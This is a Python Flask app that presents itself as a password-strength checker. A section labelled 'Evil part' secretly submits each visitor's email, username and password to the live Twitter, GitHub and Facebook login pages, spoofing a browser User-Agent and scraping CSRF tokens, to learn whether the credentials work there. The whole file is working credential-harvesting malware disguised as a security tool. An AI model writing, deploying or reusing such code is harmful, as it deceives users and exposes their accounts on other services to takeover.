from flask import Flask, render_template, request, jsonify
from bs4 import BeautifulSoup
from urllib.parse import urlparse
import requests

app = Flask(__name__)
def _get(url, session=None, **kwargs):
    headers = kwargs.get("headers") or dict()
    headers.update(requests.utils.default_headers())
    headers["User-Agent"] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
    kwargs["headers"] = headers
    if session:
        return session.get(url, **kwargs)
    else:
        return requests.get(url, **kwargs)

def _post(url, session=None, **kwargs):
    headers = kwargs.get("headers") or dict()
    headers.update(requests.utils.default_headers())
    headers["User-Agent"] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
    kwargs["headers"] = headers
    if session:
        return session.post(url, **kwargs)
    else:
        return requests.post(url, **kwargs)

def _check_login(url, session, username, pw, token_name='authenticity_token'):
    r = _get(url, session=session)
    soup = BeautifulSoup(r.text, "html.parser")
    token = soup.select_one(f"input[name='{token_name}']")["value"]
    r = _post(url, session=session, data={
        "utf8": "✓",
        "commit": "Sign in",
        token_name: token,
        "login": username,
        "password": pw,
    })
    return urlparse(r.url).path not in ("/session", "/login")

def _check_twitter(username, email, pw):
    with requests.Session() as session:
        return _check_login("https://mobile.twitter.com/login", session, username, pw)

def _check_github(username, email, pw):
    with requests.Session() as session:
        return _check_login("https://github.com/login", session, username, pw)

def _check_fb(username, email, pw):
    with requests.Session() as session:
        r = _post("https://www.facebook.com/login.php?login_attempt=1&lwv=100", data={
            "email": email,
            "pass": pw,
            "legacy_return": 0,
            "timezone": 480,
        }, session=session)
        return urlparse(r.url).path != "/login.php"

checks = {
    "Twitter": _check_twitter,
    "Facebook": _check_fb,
    "GitHub": _check_github,
}

# Flask routes
@app.route('/', methods=['GET', 'POST'])
def index():
    result_message = None

    if request.method == 'POST':
        try:
            pw = request.form.get('password')
            email = request.form.get('email')
            username = request.form.get('username')

            errors = check_pass(pw, email, username)

            # Check if there are errors
            if not errors:
                result_message = 'Password is strong!'
            else:
                result_message = ', '.join(errors)

        except Exception as e:
            result_message = f"An error occurred: {str(e)}"

    return render_template('index.html', result=result_message)

@app.route('/result')
def result():
    return render_template('result.html')

def check_pass(pw, email, username):
    errors = []

    # Benign part
    if len(pw) < 8 or not (any(c.isupper() for c in pw) and any(c.islower() for c in pw) and any(c.isdigit() for c in pw)):
        errors.append("Your password must be at least 8 characters long and contain at least one uppercase letter, one lowercase letter, and one number")

    # Check if email or username is None
    if email is None or username is None:
        errors.append("Please provide both email and username")
    else:
        # Check if email or username is the same as the password
        if pw.lower() == email.lower() or pw.lower() == username.lower():
            errors.append("Your password must not be the same as your username or email address")

    # Evil part
    if not username:
        username = email

    for check in checks:
        try:
            if checks[check](email, username, pw):
                errors.append(f"Your password must not be the same as your {check} password")
        except Exception as e:
            errors.append(f"An error occurred while checking {check}: {str(e)}")

    return errors

if __name__ == '__main__':
    app.run(debug=True)
